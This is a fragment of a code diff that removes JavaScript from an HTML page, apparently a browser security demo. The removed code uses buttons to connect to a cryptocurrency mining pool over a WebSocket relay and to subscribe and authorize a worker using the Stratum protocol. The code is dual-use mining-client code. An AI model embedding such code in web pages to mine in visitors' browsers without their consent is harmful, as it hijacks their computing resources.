-      const host = (poolHostInput.value || "").trim();
-      const port = parseInt(poolPortInput.value, 10);
-      if (!host || !Number.isFinite(port)) return;
-      if (!stratumWs || stratumWs.readyState !== WebSocket.OPEN) return;
-      stratumWs.send(JSON.stringify({ type: "tcp_connect", host, port }));
-    });
-
-    stratumTcpDisconnect.addEventListener("click", () => {
-      if (!stratumWs || stratumWs.readyState !== WebSocket.OPEN) return;
-      stratumWs.send(JSON.stringify({ type: "tcp_disconnect" }));
-    });
-
-    stratumSubscribe.addEventListener("click", () => {
-      stratumSendLine({
-        id: stratumRpcId++,
-        method: "mining.subscribe",
-        params: ["BrowserSecurityDemo/1.0"],
-      });
-    });
-
-    stratumAuthorize.addEventListener("click", () => {
-      const user = (stratumWorkerInput.value || "").trim();
-      const pass = (stratumPassInput.value || "").trim();
-      if (!user) {
-        stratumSetHint("Enter worker name before authorize.");
-        return;
-      }
-      stratumSendLine({
-        id: stratumRpcId++,
-        method: "mining.authorize",
-        params: [user, pass || "x"],
-      });
-    });
-
-    stratumLogClear.addEventListener("click", () => {
-      stratumLog.value = "";
-      stratumSetHint("");
-    });
-
-    updateStratumButtons();
   </script>
 </body>
 </html>
